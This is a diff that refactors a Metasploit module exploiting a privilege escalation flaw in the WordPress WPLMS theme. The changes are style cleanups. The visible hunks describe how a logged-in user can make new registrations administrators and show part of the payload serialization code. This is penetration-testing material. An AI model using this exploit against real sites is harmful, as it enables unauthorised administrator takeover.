@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -12,7 +13,7 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(
       info,
       'Name'            => 'WordPress WPLMS Theme Privilege Escalation',
-      'Description'     => %q{
+      'Description'     => %q(
           The WordPress WPLMS theme from version 1.5.2 to 1.8.4.1 allows an
           authenticated user of any user level to set any system option due to a lack of
           validation in the import_data function of /includes/func.php.
@@ -23,7 +24,7 @@ class MetasploitModule < Msf::Auxiliary
           role to be administrator.  This will allow for the user to create a new account
           with admin privileges via the default registration page found at
           /wp-login.php?action=register.
-      },
+      ),
       'Author'          =>
         [
           'Evex',                             # Vulnerability discovery
@@ -35,13 +36,14 @@ class MetasploitModule < Msf::Auxiliary
           ['WPVDB', '7785']
         ],
       'DisclosureDate'  => 'Feb 09 2015'
-      ))
+    ))
 
     register_options(
       [
         OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),
         OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def check
@@ -61,16 +63,14 @@ class MetasploitModule < Msf::Auxiliary
     case value
     when String, Symbol
       "s:#{value.bytesize}:\"#{value}\";"
-    when Fixnum
+    when Integer
       "i:#{value};"
     end
   end
 
   def serialize_and_encode(value)
     serialized_value = php_serialize(value)
-    unless serialized_value.nil?
-      Rex::Text.encode_base64(serialized_value)
-    end
+    Rex::Text.encode_base64(serialized_value) unless serialized_value.nil?
   end
 
   def set_wp_option(name, value, cookie)
